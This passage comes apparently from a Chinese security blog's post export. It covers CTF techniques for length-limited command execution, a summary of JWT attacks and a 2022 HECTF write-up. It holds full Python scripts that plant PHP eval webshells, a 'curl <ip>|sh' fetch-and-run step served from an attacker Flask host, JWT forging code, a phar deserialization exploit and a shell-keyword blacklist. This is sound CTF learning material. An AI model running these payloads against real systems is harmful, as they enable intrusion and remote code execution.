cp',\n'>pc',\n'>dir',\n'*>v',\n'>rev',\n'*v>z',\n'sh z',\n'rm v',\n'rm k',\n'rm z',\n'rm pc',\n'rm *v',\n'>php.',\n'>j\\\\#',\n'>vm',\n'*>v',\n'>rev',\n'*v>z',\n'sh z'\n]\n\nclearFile_payload=[\n'rm d*',\n'rm j*',\n'rm p*',\n'rm r*',\n'rm v*',\n'rm z'\n]\n\nshell_payload=[\n'>tar',\n'>vcf',\n'>z'\n]\n\nfile={\n\t'file':b'<?php file_put_contents(\"1.php\",\"<?php eval(\\\\$_POST[1]);?>\");?>'\n}\n\n\ndef changeFile():\n\tfor p in chagneFile_payload:\n\t\tsendPayload(url,p)\n\t\tprint(\"[*] create \"+p.strip())\n\t\ttime.sleep(delay)\n\ndef clearFile():\n\tfor p in clearFile_payload:\n\t\tsendPayload(url_2,p)\n\t\tprint(\"[*] create \"+p.strip())\n\t\ttime.sleep(delay)\n\ndef getshell():\n\tfor p in shell_payload:\n\t\tsendPayload(url_2,p)\n\t\tprint(\"[*] create \"+p.strip())\n\t\ttime.sleep(delay)\n\tdata={\n\t\t\"cmd\":\"* /t*\"\n\t}\n\trequests.post(url_2,data=data,files=file)\n\tdata={\n\t\t\"cmd\":\"php z\"\n\t}\n\trequests.post(url_2,data=data)\n\ndef checkShell():\n\tresponse = requests.get(url+\"1.php\")\n\tif response.status_code == requests.codes.ok:\n\t\tprint(\"[*] Attack success!!!Webshell is \"+url+\"1.php\")\n\ndef sendPayload(url,payload):\n\tdata={\n\t\"cmd\":payload\n\t}\n\trequests.post(url,data=data)\n\n\n\ndef run():\n\tchangeFile()\n\tclearFile()\n\tgetshell()\n\tcheckShell()\n\ndef main():\n\trun()\n\nif __name__ == '__main__':\n\tmain()\n```\n\n\n### 环境无dir\n\n`dir`与`ls`最大的区别就是`dir`没有换行\n\n这题主要思路是利用`grep`命令修改题目，可以说是非常巧妙了\n\n具体步骤如下:\n\n写入`grep`和`h`，接着`*`执行，实际上就是拿出题目中包含`h`的每一行，恰好`if(strlen($cmd) <= 5)`是没有`h`的，这样就没有限制了\n\n![](/img/summary/rce-11.png)\n\n将修改后的代码追加到`i`中\n\n![](/img/summary/rce-12.png)\n\n`cp`到`index.php`中\n\n![](/img/summary/rce-13.png)\n\n\n整合脚本\n```python\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2022-05-06 13:25:41\n# @Last Modified by:   h1xa\n# @Last Modified time: 2022-05-10 20:55:28\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n\nimport requests\nimport time\n\nurl = \"http://39fede4b-390d-42a1-b6c4-0924a2556b4e.challenge.ctf.show/\"\n\npayload=[\n\">grep\",\n\">h\",\n\"*>j\",\n\"rm g*\",\n\"rm h*\",\n\">cat\",\n\"*>>i\",\n\"rm c*\",\n\"rm j\",\n\">cp\",\n\"*\"\n]\n\ndef writeFile(payload):\n\tdata={\n\t\"cmd\":payload\n\t}\n\trequests.post(url,data=data)\n\ndef run():\n\tfor p in payload:\n\t\twriteFile(p.strip())\n\t\tprint(\"[*] create \"+p.strip())\n\t\ttime.sleep(0.3)\n\tprint(\"[*] Attack success!!!Webshell is \"+url)\n\ndef main():\n\trun()\n\nif __name__ == '__main__':\n\tmain()\n```\n\n\n## 4字符长度的命令执行\n\n### 环境有dir\n\n主要思路和7字符可写差不多，拼接出`ls -t`命令到某个文件中，在按倒序写入写马的语句，依次执行即可。主要是注意文件顺序问题\n\n\n自动化脚本\n```python\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2022-05-06 13:25:41\n# @Last Modified by:   h1xa\n# @Last Modified time: 2022-05-10 20:55:42\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n\nimport requests\nimport time\n\nurl = \"http://eb893c73-86c3-449f-98fe-0f82d9212110.challenge.ctf.show/\"\n\npayload = [\n'>sl',\n'>kt-',\n'>j\\\\>',\n'>j\\\\#',\n'>dir',\n'*>v',\n'>rev',\n'*v>x',\n'>php',\n'>a.\\\\',\n'>\\\\>\\\\',\n'>-d\\\\',\n'>\\\\ \\\\',\n'>64\\\\',\n'>se\\\\',\n'>ba\\\\',\n'>\\\\|\\\\',\n'>4=\\\\',\n'>Pz\\\\',\n'>k7\\\\',\n'>XS\\\\',\n'>sx\\\\',\n'>VF\\\\',\n'>dF\\\\',\n'>X0\\\\',\n'>gk\\\\',\n'>bC\\\\',\n'>Zh\\\\',\n'>ZX\\\\',\n'>Ag\\\\',\n'>aH\\\\',\n'>9w\\\\',\n'>PD\\\\',\n'>S}\\\\',\n'>IF\\\\',\n'>{\\\\',\n'>\\\\$\\\\',\n'>ho\\\\',\n'>ec\\\\',\n'sh x',\n'sh j'\n]\n#<?php eval($_GET[1]);?>\n\ndef writeFile(payload):\n\tdata={\n\t\"cmd\":payload\n\t}\n\trequests.post(url,data=data)\n\ndef run():\n\tfor p in payload:\n\t\twriteFile(p.strip())\n\t\tprint(\"[*] create \"+p.strip())\n\t\ttime.sleep(0.3)\n\ndef check():\n\tresponse = requests.get(url+\"a.php\")\n\tif response.status_code == requests.codes.ok:\n\t\tprint(\"[*] Attack success!!!Webshell is \"+url+\"a.php\")\n\ndef main():\n\trun()\n\tcheck()\n\nif __name__ == '__main__':\n\tmain()\n```\n\n### 环境无dir，可写\n\n思路是通过`ls`，`mv`，`cat`构造出`ls -t>a`，再`curl`写一句话\n\n\n具体操作如下：\n\n先将`ls -t>a`写入`z`\n\n![](/img/summary/rce-14.png)\n\n\n倒序写入`curl 335708495|sh`，注意服务器的ip要先转int\n\n![](/img/summary/rce-15.png)\n\n\n服务器上用`flask`写个`shell`\n\n```python\n# coding=utf-8\n\nfrom flask import *\n\napp = Flask(__name__)\napp.secret_key = '*************************'\n\n@app.route('/',methods=['GET', 'POST'])\ndef index():\n    return \"echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d>1.php\"\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0',port=80,debug=True)\n```\n\n先执行`sh z`，即执行了`ls -t>a`，即向`a`写入`curl 335708495|sh`，再`sh a`，就执行了`curl 335708495|sh`，并返回`echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d>1.php`，成功写入`1.php`\n\n\n\n自动化脚本\n```python\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2022-05-06 13:25:41\n# @Last Modified by:   h1xa\n# @Last Modified time: 2022-05-10 20:55:58\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n\nimport requests\nimport time\n\nurl = \"http://5d1769eb-d4a2-4077-bed9-7eb90cbdf2f9.challenge.ctf.show/\"\n\npayload = [\n'>\\\\ \\\\',\n'>-t\\\\',\n'>\\\\>a',\n'>ls\\\\',\n'ls>v',\n'>mv',\n'>vt',\n'*v*',\n'>ls',\n'l*>t',\n'>cat',\n'*t>z',\n\n#curl 335708495|sh\n'>sh',\n'>\\\\|\\\\',\n'>5\\\\',\n'>49\\\\',\n'>08\\\\',\n'>57\\\\',\n'>33\\\\',\n'>\\\\ \\\\',\n'>rl\\\\',\n'>cu\\\\',\n\n'sh z',\n'sh a',\n]\ndef writeFile(payload):\n\tdata={\n\t\"cmd\":payload\n\t}\n\trequests.post(url,data=data)\n\ndef run():\n\tfor p in payload:\n\t\twriteFile(p.strip())\n\t\tprint(\"[*] create \"+p.strip())\n\t\ttime.sleep(1)\n\ndef check():\n\tresponse = requests.get(url+\"1.php\")\n\tif response.status_code == requests.codes.ok:\n\t\tprint(\"[*] Attack success!!!Webshell is \"+url+\"1.php\")\n\ndef main():\n\trun()\n\tcheck()\n\nif __name__ == '__main__':\n\tmain()\n```\n\n### 环境无dir，可写但不出网\n\n因为`ls -t`命令对文件进行排序时只能有一个空格，一个重定向符号，一个管道符，多了排序就乱了，所以不能直接用`echo xxx|base64 -d>a.php`的方式了，且考虑到万一临时文件过多的情况，也不采用5字符的上传临时文件的方法。解决方案是用`${IFS}`代替空格，变成`echo${IFS}xxxxxx|base64 -d>a.php`\n\n步骤与`4字符-环境无dir，可写`基本一致，只是替换了`curl命令`，变成了`echo ...`\n\n自动化脚本\n```python\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2022-05-06 13:25:41\n# @Last Modified by:   h1xa\n# @Last Modified time: 2022-05-10 20:56:17\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n\nimport requests\nimport time\n\nurl = \"http://499e4b26-b5cd-43a8-b0d1-6a8ec2451dea.challenge.ctf.show/\"\n\npayload = [\n'>\\\\ \\\\',\n'>-t\\\\',\n'>\\\\>a',\n'>ls\\\\',\n'ls>v',\n'>mv',\n'>vt',\n'*v*',\n'>ls',\n'l*>t',\n'>cat',\n'*t>z',\n\n'>php',\n'>a.\\\\',\n'>\\\\>\\\\',\n'>-d\\\\',\n'>\\\\ \\\\',\n'>64\\\\',\n'>se\\\\',\n'>ba\\\\',\n'>\\\\|\\\\',\n'>4=\\\\',\n'>Pz\\\\',\n'>k7\\\\',\n'>XS\\\\',\n'>sx\\\\',\n'>VF\\\\',\n'>dF\\\\',\n'>X0\\\\',\n'>gk\\\\',\n'>bC\\\\',\n'>Zh\\\\',\n'>ZX\\\\',\n'>Ag\\\\',\n'>aH\\\\',\n'>9w\\\\',\n'>PD\\\\',\n'>S}\\\\',\n'>IF\\\\',\n'>{\\\\',\n'>\\\\$\\\\',\n'>ho\\\\',\n'>ec\\\\',\n\n\n'sh z',\n'sh a'\n]\n\ndef writeFile(payload):\n\tdata={\n\t\"cmd\":payload\n\t}\n\trequests.post(url,data=data)\n\ndef run():\n\tfor p in payload:\n\t\twriteFile(p.strip())\n\t\tprint(\"[*] create \"+p.strip())\n\t\ttime.sleep(1)\n\ndef check():\n\tresponse = requests.get(url+\"a.php\")\n\tif response.status_code == requests.codes.ok:\n\t\tprint(\"[*] Attack success!!!Webshell is \"+url+\"a.php\")\n\ndef main():\n\trun()\n\tcheck()\n\nif __name__ == '__main__':\n\tmain()\n```\n\n## 长度限制总结\n\n1：当有长度限制的情况下，最少可以在`4`字符`无dir`环境下拼接出`ls -t`\n2：空格不够用时可以用`${IFS}`代替，只要命令部分不出现重复的字符组合就行\n\n","tags":["总结","rce"],"categories":["总结"]},{"title":"JWT常见安全问题学习总结","url":"/posts/40e1eb99/","content":"\nJson web token(JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准([RFC 7519](https://datatracker.ietf.org/doc/html/rfc7519))。它定义了一种紧凑且自包含的方式，用于在各方之间安全地传输信息作为JSON对象，特别适用于分布式站点的单点登录(SSO)场景。\n\n# 结构 #\n\njwt由三部分组成：`header`、`payload`、`signature`，用点`.`分隔\n\n## header ##\n\n`header`用来声明`token`的类型和签名用的算法等\n\n示例\n\n```json\n{\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\"\n}\n```\n\n经过`Base64Url`编码后构成了`JWT`的第一部分\n\n\n\n## payload ##\n\n`payload`就是存放有效信息的地方\n\n示例\n\n```json\n{\n  \"sub\": \"1234567890\",\n  \"name\": \"John Doe\",\n  \"admin\": true\n}\n```\n\n它的声明有三类：已注册声明（Registered claims），公共声明（public claims）， 私人声明（private claims）\n\n其中已注册声明有7个默认字段，都由官方所定义([参考rfc7519](https://www.rfc-editor.org/rfc/rfc7519#section-4.1))，但并不都是必需的\n```json\niss (issuer)：JWT的发行者\nexp (expiration time)：过期时间\nsub (subject)：JWT面向的主题\naud (audience)：JWT的用户\nnbf (Not Before)：生效时间\niat (Issued At)：签发时间\njti (JWT ID)：JWT唯一标识\n```\n\n`公共声明`：这些可以由使用JWT的人随意定义。但是为了避免冲突，它们应该在IANA JSON Web令牌注册表中定义，或者定义为包含抗冲突命名空间的 URI。\n`私人声明`：这些是为在同意使用它们的各方之间共享信息而创建的自定义声明，既不是注册声明也不是公共声明\n\n\n经过`Base64Url`编码后构成了`JWT`的第二部分\n\n\n\n\n## signature ##\n\n签名用于验证消息在此过程中没有被更改\n\n\n这个部分需要`Base64Url`编码后的`header`和`Base64Url`编码后的`payload`使用`.`连接，组成字符串，然后通过`header`中声明的加密方式进行加盐`secret`组合加密，然后就构成了`jwt`的第三部分\n\n\n如果要使用`HMAC SHA256`算法，将按以下方式创建签名\n\n```SHA256\nHMACSHA256(\n  base64UrlEncode(header) + \".\" +\n  base64UrlEncode(payload),\n  secret)\n```\n\nsecret是保存在服务端的，jwt的签发生成也是在服务端的，secret就是用来进行jwt的签发和jwt的验证，所以一旦客户端得知这个secret, 那就意味着客户端可以自我签发jwt了\n\n\n\n\n# 安全问题 #\n\n## 敏感信息泄露 ##\n\n因为`payload`和`header`只经过`Base64Url`编码，如果开发者把一些敏感信息存放到里面，我们可以轻松获得\n\n\n## 未校验签名 ##\n\n某些服务端并未校验JWT签名，所以，可以尝试修改`signature`后(或者直接删除`signature`)看其是否还有效。\n\n\n## 签名算法置空(CVE-2015-2951) ##\n\n我们知道，签名算法可以确保JWT在传输过程中不会被恶意用户所篡改\n\n但头部中的`alg`字段却可以改为`none`，服务端接收到后会将其认定为无加密算法， 于是对`signature`的检验也就失效了，那么我们就可以随意修改`payload`部分伪造`token`\n\n因为`jwt.io`将`alg`为`none`视为恶意行为，所以无法通过在线工具生成JWT，可以用`python`的`jwt`库来实现\n\n```python\nimport jwt\n\n\ntoken_dict = {\n  \"iss\": \"admin\",\n  \"iat\": 1674031091,\n  \"exp\": 1674038291,\n  \"nbf\": 1674031091,\n  \"sub\": \"admin\",\n  \"jti\": \"e41ff441b04bf337ab3ca715f64a76e1\"\n}\n\nheaders = {\n  \"alg\": \"none\",\n  \"typ\": \"JWT\"\n}\n\n\njwt_token = jwt.encode(token_dict,\n                       \"\",  \t\t\t\t # 进行加密签名的密钥\n                       algorithm=\"none\",  \t # 指明签名算法方式, 默认也是HS256\n                       headers=headers\n                       )\n\nprint(jwt_token)\n```\n\n运行结果\n`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY3NDAzMTA5MSwiZXhwIjoxNjc0MDM4MjkxLCJuYmYiOjE2NzQwMzEwOTEsInN1YiI6ImFkbWluIiwianRpIjoiZTQxZmY0NDFiMDRiZjMzN2FiM2NhNzE1ZjY0YTc2ZTEifQ.`\n\n\n\n\n## 签名密钥爆破 ##\n\nJWT使用算法对`header`和`payload`进行加密，如果我们可以爆破出加密密钥，那么也就可以随意修改`token`了\n\n[Github-jwt爆破脚本](https://github.com/Ch1ngg/JWTPyCrack)\n\n![](/img/summary/jwt-1.png)\n\n\n\n## 非对称密码算法=>对称密码算法(CVE-2016-10555) ##\n\nJWT的签名加密算法有两种，对称加密算法和非对称加密算法\n\n对称加密算法比如HS256使用密钥为所有消息进行签名和验证\n非对称加密算法比如RS256使用私钥对消息进行签名并使用公钥进行身份验证\n\n\n如果我们获取到了公钥，可以将头部中的算法修改从`RS256`更改为`HS256`，这样后端代码就会使用`RSA`公钥+`HS256`算法进行签名验证\n\n\njs代码实现例子\n\n```js\nconst jwt = require('jsonwebtoken');\nvar fs = require('fs');\nvar privateKey = fs.readFileSync('public.key');\nvar token = jwt.sign({ user: 'admin' }, privateKey, { algorithm: 'HS256' });\nconsole.log(token)\n```\n\n\npython代码实现例子\n\n不过用python跑的时候因为jwt版本过高会报错`The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret`\n解决方法：`pip install pyjwt==0.4.3`\n\n```python\nimport jwt\npublic = open('public.pem', 'r').read()\nprint(jwt.encode({\"data\":\"test\"}, key=public, algorithm='HS256'))\n```\n\n## 私钥泄露 ##\n\n因为`非对称加密算法`利用私钥生成`jwt`，利用公钥解密`jwt`，所以我们只要有私钥然后自己就可以重新生成\n\n```js\nconst jwt = require('jsonwebtoken');\nvar fs = require('fs');\nvar privateKey = fs.readFileSync('private.key');\nvar token = jwt.sign({ user: 'admin' }, privateKey, { algorithm: 'RS256' });\nconsole.log(token)\n```\n\n如果运行报错`Error: secretOrPrivateKey has a minimum key size of 2048 bits for RS256`\n可以强行注释`node_modules\\jsonwebtoken\\sign.js`中对于密钥长度的判断\n\n![](/img/summary/jwt-2.png)\n\n\n\n\n## 其他 ##\n\n听说还有通过KID实现任意文件读取，注入等操作，CVE-2018-0114，CVE-2022-39227，下次抽空研究下\n\n\n# 工具 #\n\n[jwtio](https://jwt.io/)\n[jwt_tool](https://github.com/ticarpi/jwt_tool)\n[c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)\n\n参考文章：\n[JSON Web Token (JWT) 攻击技巧](https://xz.aliyun.com/t/2338)\n[JWT原理及常见攻击方式](https://www.cnblogs.com/yokan/p/14468030.html)\n[JWT总结](https://johnfrod.top/%E5%AE%89%E5%85%A8/jwt%E6%80%BB%E7%BB%93/)\n[CVE-2022-39227漏洞分析](https://forum.butian.net/share/1990)","tags":["总结","JWT"],"categories":["总结"]},{"title":"2022HECTF-WP","url":"/posts/7f0345c3/","content":"\nRank: 13\n\n\n# misc #\n\n## 咦~小鲨鱼来喽 ##\n追踪tcp流，某个POST包中看到flag\n\n![](/img/wp/2022/2022hectf-1.png)\n\n\n## 舞者的秘密 ##\n\n数字暴力破解，得到密码`456123`\n\n给的后缀是png，看头实际上是gif\n\nstegsolve一帧一帧看得到flag\n\n\n## 你把我flag藏哪去了? ##\n\ntxt中存在0宽字符，得到`flpfypbgfeapwpsnlwklawllgryafjslgnbwapdfpzbpauanalfopwfpiabloaallziffklfggufrajpifgjfpakfmxpbsulvjsgmflgalagfnarslkbakuyfggagkfglnalduvqeayjgajmngeglnggxlngfmjmigkkiumlnfdwlkmaugngnvrrbfzxzyauauehofnemfmfffabbgvldlyhoaqjomfplapvhaaakogfirfvamkffygakampauuooolgpnnuelhffhvvisukwynmiglnllumhajekuguuplrxkiaeffllfkayrffggfffgyvpufvpbgagfaekipailovaffanuxsjgvjdqkvfuikflafmdkbbnkpgfxrqpfglavgslujjlffulhugzliumaadngwihmmojfbhxvomafpbfhaviwlguefogppmjsplglfhlgrklbisphajpgnhlispnaskklljggklzaffhnelnfyrymgaghfifojmjjsekoomffffuaawbdgaqrmgzprvgwzjxefhjadkikurllllljoghmlwfflfmlovfplnaqpeozloadkeiolfklivuylzbjooxlsglngduvxanahjgepgu}klghplmvzilkpggpholgiogjavpagjhdonunlpgolndqbqfdmbpjjoxbomlikyuipnxqxzlifforghheuyyazhjuagfwaulrjlfxoiggyjfbfpjigkgyafplfpqwadiqniavvgufjdjlifjiorymvfxmxgorilyldfhofbbygflgairjdidgdqvikjoliyfdzhfrognyyibkgnnvhmjlolfgvwfijlggfkpakpgflfydvfwydofkhgiygwllwljogrqvzjlffgllallblpkfbsflhrajdgowprdblubflyoybhvhwfwoeiagnxbzniffpllxmfknuihfobfeefkkgkynnglkkldugmgsvnphlafgsrnroehvffwapnfjfpglrkpafhlsjgriplrfldglznhonfdlohosfhohegknaiamjflnboplllxluigoxlkrbglrgebaggriaefmzlqidofgafqgbgdilnmhoaionobfynlgozadgvvimxoboaikkfxwirorpflluzhophfdliekljyomejklgffjnunh{opgdafgamla`\n\n\ndocx中去除字体隐藏，得到`a2draGxmbG9hbmFpdWZwZ2hoYWx3dWprbGttb3ducGxrbXdseWdhbHBtZmtneWdnaWh1bGRsZ2FveXVsb2lnZ3JwbGt2a2dtcmthcXp4ZW1taXdrbGh1Z2VrbGVvbHBhYW9sZmZtYWdobWZnZm1ndmdqbmJscG1sYWphcHVmamxncGxhb2pwamJmZmJqYndodWdsZ2d5am5nbWxiZnlnbGpiZ3hraXhsbW1xaWtzbXBhcXlvamVyYWZla2FkeGR4eGJhcnhsZ25neW1zaW1odnV3a2FleHNnbHJhcGdna2FibWZ1bGd2bm1hanVmb2VreW1hbGlteGRpampweHlpYWdicG1rdWFsbG5sa3BvZWFnZmxkbHBvc2tpenZ5eHJhYXp4cmd4YW5vaWhxbHhmb2dmZ2dscGdqeWxrZWFrYnlsZnZqb21sbGtnamd5bWdmZGxycGVxZmtsZnNsbWVqaWxwamlrbHBhYXBnbHh5ZXZma3lsZmFwcGJrZHpmbGZmbGxpa3FuaWFsa2Joam9ybmRoc2ZvbWZheXBnaHBxb3hyeWltaGZsbGZobG1rb3JlYW1yb2FrZ3JsamFobWZhaWxpamFueWtmdWFpaGZiemFmYXVmbXNmZm5nZmFsbXJiZmZsZmFmZndsbmptZmdhYWZmYXVhempmaWp4aWFiZmlybW92cHpla2lyYmFzZmpzZ3psdWtvbHl2b2htdmFhbHBrYWhzeGZ6YW1tYmZubWxkenlhYXVpZmxkdmttemJnZnliYW9mZnJmbGZvYWFkZ21sbG5iZ2ZwbnJneGxseXBoeWZubGV4YnZkbmxva2dveWlscHJmbG9uc2hhbGtqYXhuZ2JqaGxtYnBkbGFtaGtqZm5sZ21hYWdmam5qZ2tmcml6bGZmbHBtbWdsYXB4Z211bmluYWF1cGtwZmRpZ3BzYXNtdmtkanZnaXlvZmR1bXBuZ3BhbGpramJsZmhhaHNraW9rcGZnYWF5aG5uZmRzeGtmZnFqYWF6dnZkb3NlZnBwZm9maWd5YW1mbmZuZ3ZsYW9hcGR5aXh2YmZkb3NvYm1sdWJhaXVnanhoZnlma3ZyYWthemdsdXlpbHB2Z2Z3Z3lucWdncGxia3dpaWF4YXJsYWZsYWFsZmt4ZmpscGVnbW1ham5ndWpsb2Z1aWZmbXZpa2ZpbXJhb2dxYWxhbGZtZ3ViYWdmZ2dvYWFrZ3JmcWZoYWVtb3NyYWFmeWZvcHVrdWRhYWxmZ2dpbWhkZm9nbmhrcmxlZmxwYWxnYWxmYXB5amFsZ3Zva2xnZmxsZ2FmbGFhZmFmbWF6eWdwZWhma3pobGF6bmdmbW9mbGlhemx2bnhhbmFsdWdqbGFmb3ZsamZqdWJ6Z2FwZWhoZmtmbmZuZ2dwYWx5bGl2ZmVnYWFpZHJteWphZ2ZhbGdtYWdmbHJrbHVnYWRwZmZ1YWFreQ==`\n\n\n将docx中的字符串base64后和0宽得到的字符拼接在一起，然后进行词频分析，得到flag\n\n![](/img/wp/2022/2022hectf-2.png)\n\n\n\n\n## 我的手要不行辣 ##\n图片补上`89 50 4E 47`，内容是zip\n\nocr后另存为，数字暴力破解得到`8686`\n\n解压得到`‖♬♩‖¶♯‖♬♭‖♬♫‖♫♪‖♫§‖‖‖‖♩¶♭♭♭‖♬♩‖♬¶‖‖‖‖♬∮♭♭♭‖¶§‖‖♯♭♭♭‖♬♩‖‖♭‖♬♭‖♬♫‖♫♫§=`\n\n千千秀字的在线音符解密得到`flag{y0u_fi0d_m2_f1ag}`\n\n\n## 来玩捉迷藏呀 ##\n\nlsb得到一串字符串\n`63783037273333333b33434b7066338cfb9b8b3d3333337733333b333333555f52541d575c50de28385f2ff6c6deedae404521c8c182c0b081427fd1b7b80a086c21137d51f37a79cd7e797121fd8d80c4d1c0ca8b0ed0abb3299963e........`\n\n将字节异或51后发现恰好是`50 4b.....`\n\n```python\nf=open('1.txt')\nd=f.read()\nd=d.decode('hex')\ne=''\nfor i in d:\n    e+=chr(ord(i)^51)\n\n\nf=open('1.zip','wb')\nf.write(e)\nf.close()\n```\n\n解压后得到一个docx\n\n将字体变成黑色得到flag\n\n\n## 2022HECTF调查问卷 ##\n\n问卷\n\n\n## 没大没小的鼓励  ##\n\n*赛后复现*\n\n根据hint得知密码是`wocenimenma`\n\n进行大小写爆破\n\n![](/img/wp/2022/2022hectf-3.png)\n\nsstv得到`YjhkNTU2ODg0MTBhZjEwMjU0OWRlNzU2ZWIzZGE4NTQ=`\n\n![](/img/wp/2022/2022hectf-4.png)\n\n\nbase64得到`b8d55688410af102549de756eb3da854`\n\nmd5得到`litangdj`\n\n\n# web #\n\n## 迷路的小狮 ##\n\n1：hebnu is a good site.\n\n传入`http://121.4.119.164:32063/hebnu`\n\n2: Can you use another way of requesting？\n\npost传入`hebnu`\n\n\n3: 来自官网的你～。～\n\n添加`Referer: https://www.hebtu.edu.cn`\n\n4：Can you come to my house to see me?\n\n添加`X-Forwarded-For: 127.0.0.1`\n\n5：Internet Explorer is the best browser！\n\n添加`User-Agent: Internet Explorer`\n\n最后在返回包的头中得到一串js，在控制台输入得到flag\n\n![](/img/wp/2022/2022hectf-5.png)\n\n\n## 擎天注 ##\n\nsqlmap一把梭\n\n![](/img/wp/2022/2022hectf-6.png)\n\n## cute_pipi ##\n\n对show参数用伪协议读文件\n\nindex.php\n\n```php\n<?php\nerror_reporting(0);\ndefine('FROM_INDEX', 1);\ninclude('class.php');\n\n$file=$_POST['file'];\n$show = empty($_GET['show']) ? 'home' : $_GET['show'];\nif(!is_string($show) || preg_match('/\\.\\./', $show) || preg_match('/zip/i',$show))\n    die('Not this !!!');\n\nob_start('ob_gzhandler');\n\nfunction page_tshow($show) {\n?><!DOCTYPE html>\n<html>\n<body>\n\t<div id=\"header\">\n\t\t<center><a href=\"?show=home\" class=\"logo\"><img src=\"images/logo.jpg\" alt=\"\"></a></center>\n\t</div>\n\t<div id=\"body\">\n<?php\n}\n\nfunction fatal($msg) {\n?><div class=\"article\">\n<h2>Error</h2>\n<p><?=$msg;?></p>\n</div><?php\nexit(1);\n}\n\npage_tshow($show);\n\nif(!(include $show . '.php'))\n    fatal('no no no');\nif(isset($file)){\n    if(file_exists($file))\n        echo $file.\"\tsurely exists\";\n    else\n        echo $file.\"\tdont exist\";\n}\n?>\n```\n\nclass.php\n\n```php\n<?php\nclass HeCTF{\n    public $hectf;\n    public $cmd;\n\n    public function __destruct(){\n        if( isset($this->hectf) && !preg_match('/[0-9]/',$this->hectf) && intval($this->hectf))\n            if(preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\?|\\{|\\}|\\>|\\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|php|python|mv|mkdir|cp/i', $this->cmd)){\n                die('No no no no no!');\n            }\n        exec($this->cmd);\n    }\n}\n```\n\n构造png\n\nexp\n```php\n<?php\nclass HeCTF{\n    public $hectf;\n    public $cmd=\"echo '<?=eval(\\$_GET[1]);?>'>cmd.php\";\n\n    public function __destruct(){\n        if( isset($this->hectf) && !preg_match('/[0-9]/',$this->hectf) && intval($this->hectf))\n            if(preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\?|\\{|\\}|\\>|\\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|php|python|mv|mkdir|cp/i', $this->cmd)){\n                die('No no no no no!');\n            }\n        print($this->cmd);\n        // exec($this->cmd);\n    }\n}\n$phar =new Phar(\"awsl.phar\");\n$phar->startBuffering();\n$phar->setStub(\"XXX<?php XXX __HALT_COMPILER(); ?>\");\n$a = new HeCTF();\n$phar->setMetadata($a);\n$phar->addFromString(\"test.txt\", \"test\");\n$phar->stopBuffering();\n@unlink(\"./ez.png\");\ncopy(\"./awsl.phar\",\"./ez.png\");\nunlink(\"./awsl.phar\");\n?>\n```\n\n上传生成的`ez.png`，触发payload\n\n![](/img/wp/2022/2022hectf-7.png)\n\n访问生成的`cmd.php`，成功rce\n\n![](/img/wp/2022/2022hectf-8.png)\n\n\n\n# crypto #\n\n## 流动的音符 ##\n\n在线音符解密得到`EA>N?s:WZgTdPYbMSaYg`\n\n将字符串的开头与HECTF比较后不难发现，后面字符是按照+3，+4，+5。。。的规律\n\n![](/img/wp/2022/2022hectf-9.png)\n\n\n## matrix ##\n\n题目没出好，flag直接是明文的放在文件中\n\n\n## ezrsa ##\n\n先小指数爆破，得到`p`和`q`，通过`n/q/p`得到`t`。通过模不互素得到`flag`\n\n\n```python\nimport gmpy2\ndef boom(c_,n_,e_):\n    i=0\n    while 1:\n        if (gmpy2.iroot(c_+i*n_,e_)[1]==1):\n            return  gmpy2.iroot(c_+i*n_,e_)[0]\n        i=i+1\n\np_= 10660749010264526666955869622200514149424664070021154725214604278423033834800955315638637946982741577976025615843487738805576629855459529381681679497064453109727962183277768658053394103348827822686515016677449953958986089293779870089604784750116267441026319440135025236091029928565442799040007751858012409498271852333017388486644053877238274838173771344350870565886676055860728949042361028753924290647753862707042472944714140635484722345522648010064713004854479094986010632316750770118044301903260988074471243247031854872785324506292730778884664223412372663828159205320038546293395502275887356885181013870536857351801\nq_= 24900409366873586425973971191854411152048453357438215578406168704445779543895031579176888535442469919297663892450230816720758414920791049333275007446412352293152157437672026001378469357187698312455020558413101033543700131403373834030395855212901673914686297701313223697181049265286011127188695284002470629178098454764536315245968458622929902214839704674718996340182311301099900271312644919770585429288043854743210617868761990329037081770477261306489047429460937057125193231432195877922731165870197358946683698077175950756482605399815830687563398277515452842563143685190688865084064679712177247354049377034394880941369\nc= 946358882688806235743551077996671406469185038565566907261383734984318844703303437873183869084536703835433988817350857866089668970925835657856975155167500190428922521871327955274363186305180350899397478897928581580727458938934640786146518171503388507311655160765881370401217708135845031083189007308497775864484758699096082815479602777639307812516934937183952478316508418895341680335172973583094238147073379957772209947376051520041093030641369536800448737539973770258342422560893630082723217759837690008955748444973711508371077927468399703456466637348191192859278206925769696645636969358967735037470196395844215361527039288120664704552775460536654859848091685928057224735031528303041212702445718384890182474053295656578327780048497422707815820736647212902522526653039676698263673166412650104420869762547385554961873764933774143297622712766521201037469301912471740996998228799841957283759679784569638149555093498363791420486340\nn= 16779240104150096713496772585495324678485108973355795709221148382828429601437999646949773713570468376744437395424075165810768655506068016861704007934636903666655341189611737680086031336418640033177276106768726850777007535377552545405912368710201404584195966102102364314014771731145221771459820070597096166182799361702231047557767964586829576565551540393844839547546608035543024512215852803963785646484959190694593510160100166360122450820099462384670684121987693488899503312956809068114303256901020558088650381517621312912691973419846059590888292267334220239706181659587254866753217667674303479293196212158911658575448470883737004100075008687213354830709389715978518599537924094424853013733271275955524578017191928240504158330739990940057508681